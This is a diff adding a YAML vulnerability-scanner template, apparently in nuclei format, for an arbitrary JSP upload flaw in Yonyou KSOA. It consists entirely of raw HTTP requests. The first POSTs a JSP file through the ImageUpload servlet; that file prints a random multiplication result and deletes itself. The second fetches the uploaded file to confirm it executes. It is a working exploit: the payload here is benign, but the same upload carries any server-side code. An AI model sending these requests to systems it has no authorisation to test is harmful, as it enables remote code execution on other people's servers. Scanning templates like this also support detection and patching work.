@@ -1,0 +1,38 @@
+id: poc-yaml-yonyou-ksoa-file-upload
+
+info:
+  name: poc-yaml-yonyou-ksoa-file-upload
+  author: 10cker(https://github.com/10cker)
+  severity: critical
+  tags: xray-converted,fileupload,ct-463219
+  reference:
+    - https://cn-sec.com/archives/1329088.html
+
+http:
+  - raw:
+      - |
+        POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename={{rand_base(8)}}.jsp&_ZQA_ID= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(8)}}
+
+        <%out.print({{rand_int(1000, 9999)}} * {{rand_int(1000, 9999)}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<root>"
+  - raw:
+      - |
+        GET /pictures/{{rand_base(8)}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
